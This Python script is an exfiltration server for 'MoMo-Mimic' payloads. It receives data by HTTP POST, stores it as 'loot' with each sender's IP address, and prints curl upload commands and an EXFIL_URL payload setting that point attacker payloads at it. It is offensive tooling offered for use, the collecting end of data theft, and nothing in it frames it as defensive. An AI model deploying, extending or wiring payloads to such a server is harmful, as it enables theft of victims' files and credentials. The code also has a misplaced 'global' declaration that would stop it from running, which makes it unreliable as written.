#!/usr/bin/env python3
"""
═══════════════════════════════════════════════════════════════════════════════
MoMo-Mimic Exfiltration Server
Receives data from MoMo-Mimic payloads via HTTP POST
═══════════════════════════════════════════════════════════════════════════════
"""

import http.server
import socketserver
import os
import sys
import datetime
import argparse
from urllib.parse import parse_qs, urlparse

# Configuration
DEFAULT_PORT = 8080
LOOT_DIR = "loot"

class ExfilHandler(http.server.BaseHTTPRequestHandler):
    """Handle incoming exfiltration data"""
    
    def log_message(self, format, *args):
        """Custom log format"""
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        print(f"[{timestamp}] {self.address_string()} - {format % args}")
    
    def do_GET(self):
        """Handle GET requests (status check)"""
        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.end_headers()
        
        html = """
        <html>
        <head><title>MoMo-Mimic Exfil Server</title></head>
        <body style="background:#1a1a2e; color:#16c79a; font-family:monospace; padding:20px;">
            <h1>🎭 MoMo-Mimic Exfiltration Server</h1>
            <p>Status: <span style="color:#00ff00;">ONLINE</span></p>
            <p>Waiting for data...</p>
            <hr>
            <p>Send data via POST to this server.</p>
            <code>curl -X POST http://YOUR_IP:PORT/upload -d @file.txt</code>
        </body>
        </html>
        """
        self.wfile.write(html.encode())
    
    def do_POST(self):
        """Handle POST requests (data reception)"""
        # Get content length
        content_length = int(self.headers.get('Content-Length', 0))
        
        if content_length == 0:
            self.send_response(400)
            self.end_headers()
            self.wfile.write(b"No data received")
            return
        
        # Read data
        data = self.rfile.read(content_length)
        
        # Create loot directory if not exists
        if not os.path.exists(LOOT_DIR):
            os.makedirs(LOOT_DIR)
        
        # Generate filename
        timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
        client_ip = self.address_string().replace(".", "_")
        
        # Try to get filename from path or headers
        path = urlparse(self.path).path
        if path and path != "/":
            filename = os.path.basename(path)
        else:
            filename = f"exfil_{client_ip}_{timestamp}.txt"
        
        filepath = os.path.join(LOOT_DIR, filename)
        
        # Handle duplicate filenames
        counter = 1
        base, ext = os.path.splitext(filepath)
        while os.path.exists(filepath):
            filepath = f"{base}_{counter}{ext}"
            counter += 1
        
        # Save data
        with open(filepath, "wb") as f:
            f.write(data)
        
        # Log
        print(f"[+] Received {content_length} bytes from {self.address_string()}")
        print(f"[+] Saved to: {filepath}")
        print("-" * 60)
        
        # Preview first 500 chars
        try:
            preview = data.decode('utf-8', errors='replace')[:500]
            print(f"[*] Preview:\n{preview}")
            if len(data) > 500:
                print(f"... ({len(data) - 500} more bytes)")
        except:
            print(f"[*] Binary data received, size: {len(data)} bytes")
        
        print("-" * 60)
        
        # Send response
        self.send_response(200)
        self.send_header("Content-type", "text/plain")
        self.end_headers()
        self.wfile.write(f"Data received: {len(data)} bytes".encode())


def main():
    parser = argparse.ArgumentParser(
        description="MoMo-Mimic Exfiltration Server",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python3 exfil_server.py                  # Listen on port 8080
  python3 exfil_server.py -p 9999          # Listen on port 9999
  python3 exfil_server.py -o /tmp/loot     # Save to custom directory
        """
    )
    
    parser.add_argument("-p", "--port", type=int, default=DEFAULT_PORT,
                       help=f"Port to listen on (default: {DEFAULT_PORT})")
    parser.add_argument("-o", "--output", type=str, default=LOOT_DIR,
                       help=f"Output directory for loot (default: {LOOT_DIR})")
    
    args = parser.parse_args()
    
    global LOOT_DIR
    LOOT_DIR = args.output
    
    # Create loot directory
    if not os.path.exists(LOOT_DIR):
        os.makedirs(LOOT_DIR)
    
    # Get local IP
    import socket
    hostname = socket.gethostname()
    local_ip = socket.gethostbyname(hostname)
    
    # Print banner
    print("""
╔═══════════════════════════════════════════════════════════════════╗
║                                                                     ║
║           🎭 MoMo-Mimic Exfiltration Server                        ║
║                                                                     ║
╚═══════════════════════════════════════════════════════════════════╝
    """)
    print(f"[*] Local IP:    {local_ip}")
    print(f"[*] Port:        {args.port}")
    print(f"[*] Loot Dir:    {os.path.abspath(LOOT_DIR)}")
    print("")
    print(f"[*] Payload Configuration:")
    print(f"    var EXFIL_URL = \"http://{local_ip}:{args.port}/upload\";")
    print("")
    print(f"[*] Test with:")
    print(f"    curl -X POST http://{local_ip}:{args.port}/upload -d 'test data'")
    print("")
    print("[*] Waiting for connections...")
    print("=" * 60)
    
    # Start server
    with socketserver.TCPServer(("", args.port), ExfilHandler) as httpd:
        try:
            httpd.serve_forever()
        except KeyboardInterrupt:
            print("\n[*] Server stopped")
            sys.exit(0)


if __name__ == "__main__":
    main()

